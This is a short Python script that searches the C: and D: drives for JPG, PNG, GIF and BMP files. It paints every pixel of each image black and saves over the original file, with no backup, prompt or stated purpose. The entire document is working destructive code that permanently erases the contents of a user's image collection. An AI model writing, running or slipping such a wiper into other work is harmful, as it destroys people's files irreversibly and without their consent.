import os
from PIL import Image

# List of disks to search for images
disks = ["C:", "D:"]

# Loop through each disk
for disk in disks:
    # Walk through the directory tree starting from the disk
    for root, dirs, files in os.walk(disk):
        # Loop through all files in the current directory
        for filename in files:
            # Check if the file is an image
            if filename.endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp")):
                # Open the image file
                img_path = os.path.join(root, filename)
                img = Image.open(img_path)

                # Get the image size
                width, height = img.size

                # Loop through each pixel in the image
                for x in range(width):
                    for y in range(height):
                        # Set the color of each pixel to black
                        img.putpixel((x, y), (0, 0, 0))

                # Save the modified image over the original image file
                img.save(img_path)

                print(f"{img_path} processed.")
